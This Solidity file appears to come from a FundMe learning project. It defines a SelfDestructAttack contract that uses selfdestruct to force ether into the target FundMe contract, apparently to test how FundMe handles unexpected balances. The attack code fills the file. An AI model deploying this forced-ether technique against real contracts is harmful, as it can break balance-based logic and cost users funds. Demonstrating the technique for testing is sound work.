// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "../FundMe.sol";

contract SelfDestructAttack {
    FundMe fundMeContract;

    constructor(address fundMeAddress) {
        // Use existing deployment of FundMe (note the lack of "new" keyword)
        fundMeContract = FundMe(payable(fundMeAddress));
    }

    function initialFunding() public payable {}

    function fundMeContractWithdrawSelfdestructFunds() public {
        fundMeContract.withdrawSelfdestructFunds();
    }

    function attack() public payable {
        // Cast the target contract as payable (even if it isn't, so forcing it to accept funds)
        // and call selfdestruct(address payable recipient)
        // destroying the current contract and sending its funds to the given address
        address payable addr = payable(address(fundMeContract));
        selfdestruct(addr);
    }
}
